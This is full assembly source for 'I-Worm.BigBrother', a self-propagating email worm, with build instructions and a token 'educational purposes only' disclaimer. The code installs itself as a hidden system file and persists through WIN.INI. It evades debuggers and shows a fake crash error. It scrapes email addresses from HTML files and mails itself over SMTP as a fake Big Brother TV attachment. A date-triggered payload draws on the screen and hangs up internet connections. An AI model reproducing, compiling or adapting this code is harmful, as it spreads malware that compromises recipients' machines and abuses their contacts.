;================================================================================================
;	     :ÊƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒÊ:	
;             ƒ #####################++++++++++++++++++ ƒ
;	      ƒ #:I-Worm.BigBrother #ø       !       ø+ ƒ
;	      ƒ ####################*################## ƒ
;	      ƒ	+ø       !         ø#:BioCoded by YuP # ƒ
;             ƒ ++++++++++++++++++++################### ƒ
;            :ÊƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒÊ:
;
;
;
;
; [Disclaimer]                                         
; ^~^~^~^~^~^~^
;	This file is a demonstration of WINASM coding. Educational purposes only!
;	Author is not responsabile of any kind of damages which may occur after the 
;       asembly of this file.
;	I TAKE NO RESPONSIBILITY FOR ANY ACTIONS WITH THIS CODE.
;
; [2002 CURRENT NOTES]
; This worm is so old that i don't remember when i have coded it, 
; it is VERY VERY LAME! IT WAS CODED IN THIS TIMES WHEN I THOUHGT
; THAT WINASM = API CALL! AND YOU WILL SEE IT IN A SOURCE!
; SO IT IS GOOD FOR LAMMIEZ! 
;
; Ad added 28.06.2002 - by Lord YuP / TKT - templars.org - tkt.planetsecurity.net
; [current greetz for all guyz from #virus and TKT memberz!]
;
;
;
;
; [Greetz]
; ^~^~^^~^
; Big thx goez to: * Dageshi (#VXERS) - you helped me a lot ;>.
;		   * T-2000 / Immortal Riot (4 base encoder sample).
;
; Otherz (pozdrufka) to: detergent, blaze, b0sman, Exeq, Fidiasz , Duszek, Kwaz,
;                        tompaw69, PlayerPL, Grabarz (dragon bratha) 
;			 Crash and otherz polish coderz.
;
; Bonus thx to:  Dla Karolinki (z BB) -jestes tak glupia ,ze mi cie szkoda. 
; (natchnienie)  Ricky Martin ;P, Renegat, Rino Reinz, Ciuny, Palguma, 
;		 Balon. 
;                       
; Thx 4 payload txt to: Linkin Park (R) KeWl Music Group
;
; [How to Compile]
; ^~^~^~^~^~^~^~^
; %: tasm32 /m1 /mx big.asm
; %: tlink32 /Tpe /aa  big,big,,import32.lib
; %: brc32 big.res
; 
; % NOTE. File is also compressed & encrypted by tElock tool ,ver.051
; 
;
;
; [Info]
; ^~^~^~
; .:[SUPPORT.AVX.COM]: (my commentz in *[]*)
;
;
;
; Details:
;---------
;Name : I-Worm.BigBrother
;Type: Internet Worm
;Aliases: none
;Size: 12800 bytes
;
;At the time of writing this we have only received one report of infection.
;
;
;Description:
;---------------
;This is a virus which arrives in your e-mail in the following formatt:
;
;From: "BIGBROTHER TVN POLSKA" bigbrother@bigbrother.tvn.com.pl
;Subject: BIGBROTHER SHOW !
;
;Body: Teraz mozesz ogladac BIGBROTHER SHOW za pomoca komputera! Jak to
;zrobic? Wystarczy ze uruchomisz specjalny program
;(BIGBROTHER_LIVE_CAMERA.EXE) , ktory zostal dolaczony do wiadomosci.
;Ponadto za pomoca tego narzedzia mozesz nominowac wybrane przez ciebie
;osoby, do opuszczenia domu Wielkiego Brata. Co miesiac rozlosowane beda
;nagrody (telewizory, wieze stereo,
;komputery ...i wiele ,wiele innych). Prosimy przysylac
;opinie i komentarze na temat programu.
;
;
;Zyczymy milej zabawy:
;
;Redakcja programu.
;
;Attachment: BigBrother_Live_Camera.exe
;
;When the user opens the attachment, the virus copies itself to C:\WINDOWS\SYSTEM with the name: ;b1g_brother.exe
;and adds the following line in WIN.INI: in the section [windows]
;
;run=c:\Windows\System\b1g_brother.exe
;
;After that it checks if the computer is connected to the Internet and then starts sending itself ;through e-mail in the format presented above.
;
;In order to get e-mail addresses it scans all hard drives for html files and it search inside ;them for the string mailto:, and it sends itself to those addresses. *[no in hd but in 
;My Documents folder na Temp]*
;
;In case of running the b1g_brother.exe manually it shows the following message:
;SEGMENTATION FAULT.
;Please REPORT this BUG.
;
 
;Payload:
;-----------
;On May 13 it displays the following message:

;You like to think you∆re never wrong 
;You want to act like you∆re someone 
;You want someone to hurt like you 
;You want to share what you∆ve been through 
;You live what you learn... 
;
;Today you know the truth: i-worm.BigBrother 
;Now contact with yourz AV expert. 
;Future , Don't trust anyone ... 
;                               [YuP/0ne Earth]
;payyes *[what?]*

;Detection has been added.
;
;
;
;
; [Bugz] 
; ^~^~^~
; This i-worm should be able to work on win32 platformz without any erroz. Opps ;) it should be.
; On win98 (when i and dageshi were testing it) were some bugz (win98 fuck out).
; I don't know why ;) i don't have any time to check it with any debugER ;]
; do it yourself if you want of coz. This is my 1st i-worm and its very 
; 'low-coded' i think ... The next onez should be better.
;
;
;================================================================================================
; 				        [L]etz  [S]tart 
; 				       oO-= Have fun! =-Oo	
;================================================================================================

.486p
locals
jumps
.model flat,STDCALL

extrn ExitProcess:PROC   ;i love it 
extrn CopyFileA:PROC  	 ;did i miss sth ? 
extrn MessageBoxA:PROC
extrn SetFileAttributesA:PROC
extrn GetSystemDirectoryA:PROC
extrn lstrcatA:PROC
extrn lstrcpyA:PROC
extrn CreateFileA:PROC
extrn ExitWindowsEx:PROC
extrn Sleep:PROC
extrn CreateMutexA:PROC
extrn GetCurrentProcessId:PROC
extrn LoadLibraryA:PROC
extrn GetProcAddress:PROC
extrn PeekMessageA:PROC
extrn OpenMutexA:PROC
extrn RegOpenKeyExA:PROC
extrn RegQueryValueExA:PROC
extrn RegCloseKey:PROC
extrn FindFirstFileA:PROC
extrn FindNextFileA:PROC
extrn CreateFileA:PROC
extrn CloseHandle:PROC
extrn ReadFile:proc
extrn CharNextA:PROC
extrn lstrcpyn:PROC
extrn lstrlenA:PROC
extrn lstrcmp:PROC
extrn lstrcpy:PROC
extrn FindClose:PROC
extrn GetTopWindow:PROC
extrn GetNextWindowA:PROC
extrn PostMessageA:PROC
extrn GetActiveWindow:PROC
extrn GetTempPathA:PROC
extrn send:PROC
extrn recv:PROC
extrn WSAStartup:PROC
extrn WSACleanup:PROC
extrn socket:proc
extrn connect:PROC
extrn gethostbyname:PROC
extrn closesocket:PROC
extrn lstrlen:PROC
extrn WinExec:PROC
extrn lstrcmpi:PROC
extrn ReleaseMutex:PROC
extrn GetFileSize:PROC
extrn WriteFile:PROC
extrn GetModuleFileNameA:PROC
extrn GetCurrentDirectoryA:PROC
extrn _lread:PROC
extrn SetCurrentDirectoryA:PROC
extrn WriteProfileStringA:PROC
extrn RegCreateKeyA:PROC
extrn RegOpenKeyA:PROC

;extrnz for payload
extrn SetTextColor:PROC
extrn GetDC:PROC
extrn TextOutA:PROC
extrn CreateFontA:PROC
extrn SelectObject:PROC
extrn LineTo:PROC
extrn GetSystemTime:PROC
extrn SetBkColor:PROC
extrn CreatePen:PROC



.DATA


signature db "[I-WORM.BigBr0th3r] (c) YuP",0
          db "Greetz to all #PHREAKPL CREW",0
          db "and #VXERS TERRORIST GROUP.",0
          db "Special thx goez to: Dageshi",0
          db "& detergent ",0
          db "-=* GOOD WORK AV PEOPLE ;P *=-",0

myname db 256 dup(?)
new db '\b1g_brother.exe',0
sysD db	256 dup(?)
sysDD db 256 dup(?)
tempD db 256 dup(?)
markerr db 'rundll32 kernel,FatalExit',0
krnl db 'KERNEL32.DLL',0
krnl_proc db 'RegisterServiceProcess',0
mutex_name db 'Kakaroth',0
mutexH dd ?
sys_name db 'b1g_brother.exe',0

module_filename db 256 dup(?)
dir db 1024 dup(?)
bslash db '\',0

;check connection
hang_connection   db 'InternetHangUp',0
check_connection  db 'InternetGetConnectedState',0
wininet_lib db 'WININET.DLL',0
lpdwFlagz dd 0


ini_key  db 'run',0
ini_sect db 'windows',0



;FOR REGISTRY
HKEY_LOCAL_MACHINE equ 80000001h
HKEY_CURRENT_USER equ 80000001h
hKeyPath db 'Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders',0
hPersonal db 'Personal',0
PersonalF db 128 dup(0)
PersonalFsize dd 128
hKeyHandle dd 0
my_key db 'Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\silent_thunder',0
shit dd 0
shitshit dd 0

server_p db 'Software\Microsoft\Internet Account Manager\Accounts\00000001',0
server_h dd 0
server_s db 'SMTP Server',0
server db 128 dup(0)
server_size dd 128

;FOR SEARCH
fMASK db '\*.htm*',0
fMASK1 db '*.htm*',0
break db '\',0
oldd dd 128 dup(0)
bus db 260 dup(0) ;search buffer ;]
fsH dd ?
fHnd dd ?
sciezka db 260 dup(0)

WIN32_FIND_DATA         struc
dwFileAttributes        dd      0
dwLowDateTime0          dd      ?       ; creation
dwHigDateTime0          dd      ?
dwLowDateTime1          dd      ?       ; last access
dwHigDateTime1          dd      ?
dwLowDateTime2          dd      ?       ; last write
dwHigDateTime2          dd      ?
nFileSizeHigh           dd      ?
nFileSizeLow            dd      ?
dwReserved              dd      0,0
cFileName               db      260 dup(0)
cAlternateFilename      db      14 dup(0)
                        db      2 dup(0)
WIN32_FIND_DATA         ends

find_data               WIN32_FIND_DATA <?>

;for e-mailz
mail db 'mailto:',0
worm_size equ 10000h
worm_code db worm_size dup(0)
fH dd ?
searchH dd ?
counter equ 0
longBuff dd ?
clear db '',0
myB db 128 dup(?)
L1 db '"',0
mail_string db 128 dup(0)
mail_good db 128 dup(0)
sep db '',0

;======================[BASE ENCODE DATA]===============================
base_file db '00000b.rat',0
base_file_name db 128 dup(0)
base_to_code db '000000s.b64',0
base_to_code_buff db 128 dup(0)

Encoding_Table: DB      'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
                DB      'abcdefghijklmnopqrstuvwxyz'
                DB      '0123456789+/'

Input_Buffer    DB      200 DUP(0)
Output_Buffer   DB      200 DUP(0)

base_buff_size  equ 18516
base_buffer     DB base_buff_size DUP(0)  
base_size       dd 0
baL dd ?




input_handle dd ?
Input_Handle dd ?
output_handle dd ?
Output_Handle dd ?

IO_Bytes_Count  DD      0

OPEN_EXISTING           EQU     00000003h
CREATE_ALWAYS           EQU     00000002h
FILE_ATTRIBUTE_NORMAL   EQU     00000080h
GENERIC_READ            EQU     80000000h
GENERIC_WRITE           EQU     40000000h

;============[E-MAIL CLIEN7]========================
HELO db 'HELO bigbrother.r0x.pl',0dh,0ah


mime_code  db 'From: "BIGBROTHER TVN POLSKA" <bigbrother@bigbrother.tvn.com.pl>',0dh,0ah 
           db 'Subject: BIGBROTHER SHOW !',0dh,0ah
           db 'MIME-Version: 1.0',0dh,0ah
           db 'Content-Type: multipart/mixed; boundary="a1234"',0dh,0ah
           db 0dh,0ah,'--a1234',0dh,0ah
           db 'Content-Type: text/plain; charset=us-ascii',0dh,0ah
	   db 'Content-Transfer-Encoding: 7bit',0dh,0ah,0dh,0ah
	   db 0dh,0ah
           db 'Teraz mozesz ogladac BIGBROTHER SHOW za pomoca komputera! Jak to',0dh,0ah 
           db 'zrobic? Wystarczy ze uruchomisz specjalny program',0dh,0ah 
           db '(BIGBROTHER_LIVE_CAMERA.EXE) , ktory zostal dolaczony do wiadomosci.',0dh,0ah 
           db 'Ponadto za pomoca tego narzedzia mozesz nominowac wybrane przez ciebie',0dh,0ah 
           db 'osoby, do opuszczenia domu Wielkiego Brata. Co miesiac rozlosowane beda',0dh,0ah 
           db 'nagrody (telewizory, wieze stereo,',0dh,0ah
           db 'komputery ...i wiele ,wiele innych). Prosimy przysylac',0dh,0ah
           db 'opinie i komentarze na temat programu.',0dh,0ah
           db 0dh,0ah
           db 0dh,0ah
           db 'Zyczymy milej zabawy:',0dh,0ah
           db 0dh,0ah
           db 'Redakcja programu.',0dh,0ah
	   db '',0dh,0ah
           db 0dh,0ah
           db 0dh,0ah,'--a1234',0dh,0ah
           db 'Content-Type: application/octet-stream; name="BigBrother_Live_Camera.exe"'
           db 0dh,0ah,'Content-Transfer-Encoding: base64',0dh,0ah
           db 'Content-Disposition: attachment; filename="BigBrother_Live_Camera.exe"',0dh,0ah,0dh,0ah

mime_end db  0dh,0ah,'--a1234--',0dh,0ah,0dh,0ah,0
mime_e equ mime_end

dot db '.',0dh,0ah

RCPT_1 db 'RCPT TO:<',0
RCPT_ENDD db '>',0dh,0ah,0

RCPT db	160 dup (?)	


MAIL_FROM db 'MAIL FROM:<bigbrohter@tvn.pl>',0dh,0ah

QUIT db 'QUIT',0dh,0ah 
_DATA_ db 'DATA',0dh,0ah

e_end db '',0



;==================================[END MAIL DATA]====================================

;==================================[WIN SOCKZ]========================================

addr    struc
proto   dw 2     
port    dw 1900h 
ip      db 127,0,0,1      
addr    ends

addr2 addr <>


sock dd ?
SOCK_STREAM EQU 1 
AF_INET EQU 2     
WSA_Data DB 400 DUP(0)
SOCKET_ERR equ -1
HOSTENT_IP equ 10h  

rB dd ?
;==================[END WIN SOCKZ]=========================================

;============[END E-MAIL DATA]=============================================

;FOR STEALTH
err_title db 'Setup',0
markerror db 'Segmentation fault.',0dh,0ah,0dh,0ah
          db      'Please REPORT this BUG.',0
          db      0dh,0ah,0


;PAYLOAD

;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*
;===========[PAYL0AD ;))]================================================== 
dcH dd ?
brH dd ?
fontH dd ?                                          		;~^~^~^~^~^~^~^^~^~^~^~^
info_line_1 db "You like to think youíre never wrong",0  	;some lyrics from:
info_line_2 db "You want to act like youíre someone",0   	;'POINTS OF AUTHORITY' - song
info_line_3 db "You want someone to hurt like you",0     	;of my best music group -     
info_line_4 db "You want to share what youíve been through",0   ;[L]inkin [P]ark ;))
info_line_5 db "You live what you learn...",0 			;~^~^~^~^~^~^~^~^~^~^~^~^

info_line_6 db "Today you know the truth: i-worm.BigBrother",0	;some txt from myself
info_line_7 db 'Now contact with yourz AV expert.',0
info_line_8 db "Future , Don't trust anyone ... [YuP/0ne Earth]",0

sysTimeStruct db 16 dup(0)

payday db 128 dup(0)
payyes db 'payyes',0

;===========[END PAY DATA]=================================================
;-------------------------------------------------------------------------*
;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*
;-------------------------------------------------------------------------*
;===========[CODE SECTION]=================================================

.CODE
Kakaroth:
push 256
push offset module_filename
push 0
call GetModuleFileNameA

xor ebp,ebp
mov ebp,offset module_filename

push offset dir
push 256
call GetCurrentDirectoryA

push offset bslash
push offset dir
call lstrcatA

push offset dir
call lstrlen
mov edi,eax

sub ecx,edi

C_NEXT:
push ebp
call CharNextA
mov ebp,eax

dec edi
jnz C_NEXT

push ecx
push ebp
push offset myname
call lstrcpyn

@DEBUG_CODE:
lea     eax,dword ptr [esp-8h]          
xor     esi,esi
xchg    eax,dword ptr fs:[esi]
lea     edi,exception
push    edi


push    eax

call    @antidebug       
                
@antidebug:                                 
add esp,4
cmp esi,dword ptr fs:[esi+20h]      
je  @SKIP_DEBUG
jmp @HEART_STOPS
          
@SKIP_DEBUG:
push 0                      
push 0                        
push 0                       
push 0
push 0
call PeekMessageA

@COPY_FILE:
push 256
push offset sysD
call GetSystemDirectoryA

xor eax,eax

push offset new
push offset sysD
call lstrcatA
cmp eax,0
jc @EXIT

push 0
push offset sysD
push offset myname
call CopyFileA
cmp eax,0
jc @EXIT

push 01h OR 02h
push offset sysD
call SetFileAttributesA

push offset myname
push offset sys_name
call lstrcmpi
cmp eax,0
jne @RUN_SYS_FILE

@_CHECK_4_PAYLOAD:
push offset sysTimeStruct
call GetSystemTime
xor eax,eax
lea eax,sysTimeStruct
cmp word ptr [eax+2],5 ; 13th May
jne @SKIP_PAY
cmp word ptr [eax+6],13 
jne @SKIP_PAY    


@PAY:		;payload
push 50000      ;sp00ky one ;)) 
call Sleep	;wait some time 

push 0h
call GetDC
mov dword ptr [dcH],eax

push 0 
push 1000h
push 1
call CreatePen
mov dword ptr [brH],eax

push dword ptr [brH]
push dword ptr [dcH]
call SelectObject

push 500
push 300
push dword ptr [dcH]
call LineTo

;=======[FONT]=================================================
push 0h
push 0h
push 0h
push 0h
push 0h
push 0h
push 0h
push 0h
push 0h
push 0
push 0
push 13
push 23
call CreateFontA
mov dword ptr [fontH],eax


push dword ptr [fontH]
push dword ptr [dcH]
call SelectObject



push 0 
push dword ptr [dcH]
call SetBkColor


push 16777215 		;color - white 
push dword ptr [dcH]
call SetTextColor


;======[END FONT]===========================================


@TEXT:
push 16777215
push dword ptr [dcH]
call SetTextColor

mov esi,160
mov edx,offset info_line_1
mov ecx,140
call @TEXT_OUT

mov edx,offset info_line_2
mov ecx,170
call @TEXT_OUT

mov edx,offset info_line_3
mov ecx,200
call @TEXT_OUT

mov edx,offset info_line_4
mov ecx,230
call @TEXT_OUT

mov edx,offset info_line_5
mov ecx,260
call @TEXT_OUT

mov esi,160
mov edx,offset info_line_6
mov ecx,350
call @TEXT_OUT

mov esi,160
mov edx,offset info_line_7
mov ecx,380
call @TEXT_OUT

mov esi,160
mov edx,offset info_line_8
mov ecx,435
call @TEXT_OUT

push offset payyes
push offset payday
call lstrcatA

call @SKIP_PAY


@TEXT_OUT: 		;text-out function 
push edx
call lstrlenA

push eax
push edx
push ecx
push esi
push dword ptr [dcH]
call TextOutA

ret


@SKIP_PAY:
@RESIDENT:
push offset mutex_name  ;am i in memory now ?
push 0
push 1
call OpenMutexA
cmp eax,0
jne @I_WAS_HERE
je @NEXT_

@I_WAS_HERE:
push 010h
push offset err_title
push offset markerror
push 0h
call MessageBoxA
push 0h
call ExitProcess

@NEXT_:
push offset mutex_name ;nop then go there
push 1
push 0
call CreateMutexA
mov dword ptr [mutexH],eax

xor edx,edx
xor eax,eax

push offset krnl
call LoadLibraryA
cmp eax,0
jc @EXIT
push offset krnl_proc
push eax
call GetProcAddress
or eax,eax
jz @PR
mov edx,eax

call GetCurrentProcessId

;push 1
;push eax
;call edx

@PR:
push offset sysD
push offset ini_key
push offset ini_sect
call WriteProfileStringA


call @GET_MAILZ_START

@GET_MAILZ_START:
xor eax,eax
push offset hKeyHandle                  
push 0                              
push 0
push offset hKeyPath
push HKEY_LOCAL_MACHINE
call RegOpenKeyExA
cmp eax,0
jne @EXIT

push offset PersonalFsize               
push offset PersonalF                
push 0
push 0
push offset hPersonal
push hKeyHandle  
call RegQueryValueExA

push offset server_h                  
push 0                              
push 0
push offset server_p
push HKEY_CURRENT_USER
call RegOpenKeyExA
cmp eax,0
jne @EXIT

push offset server_size              
push offset server               
push 0
push 0
push offset server_s
push server_h  
call RegQueryValueExA

;PersonalF -> like My Docz

push hKeyHandle
call RegCloseKey




push offset base_file_name
push 260
call GetTempPathA

push offset base_file
push offset base_file_name
call lstrcatA


;=======================[BASE ENCODER]==========================
;Thx goez to: * T-2000 / Immortal Riot (4 base encoder sample) +
;             * dageshi (4 everything)                         +
;=============================================================== 
@_BASE_ENCODER:


push offset base_to_code_buff ;copy source file
push 260
call GetTempPathA

push offset base_to_code
push offset base_to_code_buff
call lstrcatA

push 1
push offset base_to_code_buff
push offset sysD
call CopyFileA


;ble ble ble


XOR EBX, EBX

PUSH EBX                    
PUSH FILE_ATTRIBUTE_NORMAL
PUSH OPEN_EXISTING
PUSH EBX
PUSH EBX
PUSH GENERIC_READ
PUSH OFFSET base_to_code_buff      
CALL CreateFileA

MOV [Input_Handle], EAX

PUSH EBX                 
PUSH FILE_ATTRIBUTE_NORMAL
PUSH CREATE_ALWAYS
PUSH EBX
PUSH EBX
PUSH GENERIC_WRITE
push OFFSET base_file_name 
CALL CreateFileA

MOV [Output_Handle], EAX

PUSH 0                            ;wpiszem standard
PUSH OFFSET IO_Bytes_Count
PUSH (offset mime_end-offset mime_code)
push offset mime_code
PUSH [Output_Handle]
CALL WriteFile
cmp eax,0
je @ERROR

PUSH EBX                      ;size
PUSH [Input_Handle]
CALL GetFileSize

CDQ
MOV ECX, (76/4)*3
DIV ECX

DEC EDX
JS  No_Round

INC EAX

No_Round: 
XCHG ECX, EAX

Encode_Line:    
PUSH ECX

MOV ESI, OFFSET Input_Buffer

PUSH 0
PUSH OFFSET IO_Bytes_Count
PUSH (76/4)*3
PUSH ESI
PUSH [Input_Handle]
CALL ReadFile

MOV EDI, OFFSET Output_Buffer

PUSH EDI

PUSH 76/4
POP ECX

Encode_Packet:  
PUSH ECX

MOV CL, 8

LODSB
SHL EAX, CL

LODSB
SHL EAX, CL

LODSB
SHL EAX, CL

MOV EBX, OFFSET Encoding_Table

MOV CL, 4

Encode_Byte:   
SHR EAX, 2

ROL EAX, 8

XLAT
STOSB

LOOP Encode_Byte

POP ECX

LOOP Encode_Packet

MOV WORD PTR [EDI], 0A0Dh   ; <CRLF>.

POP EAX

PUSH 0
PUSH OFFSET IO_Bytes_Count
PUSH 78
PUSH EAX
PUSH [Output_Handle]
CALL WriteFile

POP ECX

LOOP Encode_Line

push [Output_Handle]
call CloseHandle


;=====================================================[END BASE ENCODER]===========

;=====================================================[GET BASE CODE TO BUFF]======

@GET_BASE_CODE:
push 00000000h 
push 00000080h
push 00000003h
push 00000000h
push 00000001h
push 80000000h
push offset base_file_name     
call CreateFileA   
mov edi,eax


push 0
push edi
call GetFileSize


push 0                       
push offset baL
push eax
push offset base_buffer
push edi
call ReadFile

;=====================================================[END GETTING]===============
@NEXT__:
push offset shitshit
push offset my_key
push HKEY_LOCAL_MACHINE
call RegOpenKeyA
cmp eax,0
je @EXIT

push offset shit
push offset my_key
push HKEY_LOCAL_MACHINE
call RegCreateKeyA

mov bh,0
mov bl,0
CALL @SCAN_MYDOCZ

@SCAN_TEMP:
push offset tempD
push 260
call GetTempPathA

push offset clear
push offset bus
call lstrcpyA

push offset tempD
push offset bus
call lstrcpyA

push offset fMASK1 ;add 
push offset bus
call lstrcatA


call @FIND_1st
call @GO_GO1

@SCAN_MYDOCZ:
xor edi,edi

push offset clear
push offset bus
call lstrcpyA

push offset PersonalF 
push offset bus
call lstrcpyA

push offset fMASK ;add 
push offset bus
call lstrcatA

call @FIND_1st
call @GO_GO

@FIND_1st:

push offset find_data
push offset bus
call FindFirstFileA
mov dword ptr [searchH],eax
cmp eax,-1    
je @ERROR

ret

@CLEAR_PATH:
push offset clear
push offset sciezka
call lstrcpyA
ret

@GO_GO:
call @CLEAR_PATH
xor edi,edi
push offset PersonalF
push offset sciezka
call lstrcatA
push offset break
push offset sciezka
call lstrcatA
push offset find_data.cFileName
push offset sciezka
call lstrcatA
xor edi,edi
mov edi,offset sciezka
call @SCAN_HTM_FILE_STEP1

@GO_GO1:
call @CLEAR_PATH
xor edi,edi
push offset tempD
push offset sciezka
call lstrcatA
push offset break
push offset sciezka
call lstrcatA
push offset find_data.cFileName
push offset sciezka
call lstrcatA
xor edi,edi
mov edi,offset sciezka
call @SCAN_HTM_FILE_STEP1



@SCAN_HTM_FILE_STEP1:

push 00000000h 
push 00000080h
push 00000003h
push 00000000h
push 00000001h
push 80000000h
push edi     
call CreateFileA   
cmp  eax,-1  
je @ERROR_M

mov dword ptr [fH],eax 


push 0h
push offset longBuff
push worm_size ;size
push offset worm_code 
push dword ptr [fH]
call ReadFile
cmp eax,0
je @ERROR_M

call @CLEAR

@MARK:
xor esi,esi
mov esi,0
xor ebp,ebp
mov ebp,offset worm_code
xor edi,edi
mov edi,1

@ALGORITM:
xor edi,edi
mov edi,1
call LOOPING_JOE

push offset L1
push offset myB
call lstrcmp
cmp eax,0
je @CH

inc esi
cmp esi,10000
ja @END_OF_FILE
call @ALGORITM

@CH:
call @CLEAR
call @CHECK_STRING

LOOPING_JOE:
push ebp
call CharNextA
mov ebp,eax

push 2
push ebp        
push offset myB 
call lstrcpyn

ret


@CHECK_STRING:
call LOOPING_JOE

push offset myB
push offset mail_string
call lstrcatA

inc esi
inc edi
cmp edi,8
jne @CHECK_STRING
je @IS_IT_GOD

@IS_IT_GOD:
push offset mail
push offset mail_string
call lstrcmp
cmp eax,0
je @GET_MAIL
jne @ALGORITM


@GET_MAIL:
call LOOPING_JOE

push offset L1
push offset myB
call lstrcmp
cmp eax,0
je @END_MAIL

push offset myB
push offset mail_good
call lstrcatA

inc esi
cmp esi,1000
jne @GET_MAIL

@END_MAIL:  ;TU GEN MAIL 

inc bl
cmp bl,10
ja @ERROR

call @SEND_MAIL

@NEXT_MAILL:
xor edi,edi
mov edi,1

call @ALGORITM

@END_OF_FILE:
push dword ptr [fH]
call CloseHandle

xor eax,eax
xor ebp,ebp
call @CLEAR
call @CLEAR_BUFF
call @FIND_NEXT_FILE

@CLEAR:
push offset sep
push offset mail_good
call lstrcpy
push offset sep
push offset mail_string
call lstrcpy
ret

@CLEAR_BUFF:
push offset sep
push offset worm_code
call lstrcpy
ret

exception:                                     
xor esi,esi                         
mov eax,dword ptr fs:[esi]
mov esp,dword ptr [eax]

@FIND_NEXT_FILE:

push offset find_data
push dword ptr [searchH]
call FindNextFileA
cmp eax,0
je @ERROR_NO_FILEZ_LEFT

cmp bh,1
ja @GO_TO_GO1
call @GO_GO

@GO_TO_GO1:
call @GO_GO1

@ERROR:

push dword ptr [fHnd]                
call CloseHandle

call @EXIT

@ERROR_M:
push dword ptr [searchH]
call FindClose
call @EXIT


@ERROR_NO_FILEZ_LEFT:
cmp bh,2
je @ERROR_M
ja @ERROR_M
add bh,2
push dword ptr [searchH]
call FindClose
call @SCAN_TEMP


@SEND_MAIL:
push offset RCPT_1
push offset RCPT
call lstrcatA

push offset mail_good
push offset RCPT
call lstrcatA

push offset RCPT_ENDD
push offset RCPT
call lstrcatA

;======[CHECK INTERNET STATE]=======
;WININET.DLL REQUIRED :>           +
;===================================
@CHECK_CONN:
push 500		;little stealth 
call Sleep

push offset wininet_lib
call LoadLibraryA

push offset check_connection
push eax
call GetProcAddress
xchg eax,ecx
jecxz @INIT_W

;push 0
;push offset lpdwFlagz
;call ecx
;or eax,eax
;jz @CHECK_CONN


;======[INIT WINSOCK]================
@INIT_W:
push offset WSA_Data         
PUSH 0101h
CALL WSAStartup
cmp eax,0
jne @EXIT

push 0		
push SOCK_STREAM			
push AF_INET				
call socket                  		
cmp  eax,SOCKET_ERR			
je   @CLEAN
mov  sock,eax

;======[CONNECT]=====================

;push    offset server
;call    gethostbyname                   
;cmp     eax,0
;je      @CLEAN


;mov     eax,dword ptr [eax+HOSTENT_IP]  
;mov     eax,dword ptr [eax]
;mov     dword ptr [addr2.ip],eax


push 16
push offset addr2
push sock
call connect        
cmp ax,SOCKET_ERR	
je @CLEAN	  

;======[READ AND SEND LOOP]==========

push 20
call Sleep
push 0
push 512
push offset rB
push sock
call recv

push 0
push 24
push offset HELO
push sock
call send

push 20
call Sleep
push 0
push 512
push offset rB
push sock
call recv

push 0
push 31
push offset MAIL_FROM
push sock
call send

push 20
call Sleep
push 0
push 512
push offset rB
push sock
call recv

push offset RCPT
call lstrlen

push 0
push eax
push offset RCPT
push sock
call send

push 20
call Sleep
push 0
push 512
push offset rB
push sock
call recv

push 0
push 6
push offset _DATA_
push sock
call send

push 20
call Sleep
push 0
push 512
push offset rB
push sock
call recv

push offset base_buffer
call lstrlen

push 0
push eax
push offset base_buffer
push sock
call send


push 0
push 3
push offset dot
push sock
call send

push 20
call Sleep
push 0
push 512
push offset rB
push sock
call recv

push 0
push 6
push offset QUIT
push sock
call send

push sock
call closesocket

call WSACleanup

push offset sep
push offset RCPT
call lstrcpy

push 5000
call Sleep

call @NEXT_MAILL

@EX:

push sock
call closesocket
push 0h
call ExitProcess

@CLEAN:
call WSACleanup
push 0h
call @EXIT



@EXIT:
push offset payday
push offset payyes
call lstrcmp
cmp eax,0
je @HANG_ALL_CONNECTIoNZ
jne _STAY_IN_MEM


_STAY_IN_MEM:
push 50000
call Sleep
call _STAY_IN_MEM

@BUFFER_OVERFLOW:
call GetActiveWindow      ;zabijamy aktywne okno przypuszczalnie debugger
mov edx,eax               ;nieskonczona petla powoduje blad w kernelu
push 0                 	  ;plik robaka bedzie dostepny po resecie systemu ;))      
push 0                        
push 12h                        
push edx                        
call PostMessageA               
CALL @BUFFER_OVERFLOW

@HEART_STOPS:
push 1
push offset markerr
call WinExec

push 100
call Sleep

call @BUFFER_OVERFLOW

@RUN_SYS_FILE:
push 256
push offset sysDD
call GetSystemDirectoryA

push offset sysDD
call SetCurrentDirectoryA

push 500
call Sleep

push 1
push offset sysD
call WinExec

push dword ptr [mutexH]
call ReleaseMutex

push 0h
call ExitProcess


@HANG_ALL_CONNECTIoNZ:

push 500		;timer 
call Sleep

push offset wininet_lib
call LoadLibraryA

push offset hang_connection
push eax
call GetProcAddress
xchg eax,ecx

push 0h				;kiss me goodbye ;) 
push offset lpdwFlagz           ;I don`t know that this WININET
call ecx                        ;function is working ;)  Refer
call @HANG_ALL_CONNECTIoNZ 	;to Jacob Navia it should be. 
				;[*Nice 'WININET' Ref ;) Big Thx :*]
End Kakaroth
;================================================================================================
; +1679 linez of asm c0de ;)) ? I did it ? he he ... 
; 
;================================================================================================
;***** This is the end of your jurney... Sorry about commentz...i know - my english skillz. *****
;================================================================================================
;      				eEEEEEe   nNn    Nn   dDDDd                                    #+
;				EE        NNnN   nN   Dd   dD				       #+
;   				EEEe      nN nN  nN   dD    dD  			       #+
;   				EE        NN  nN nN   Dd   dD  	              		       #+
;  				eEEEEEe   nN   nNNn   dDDDd				       #+
; 											       #+
;			      -= .: CoDinG is No7 a CrIm3 :. =-                                #+
;================================================================================================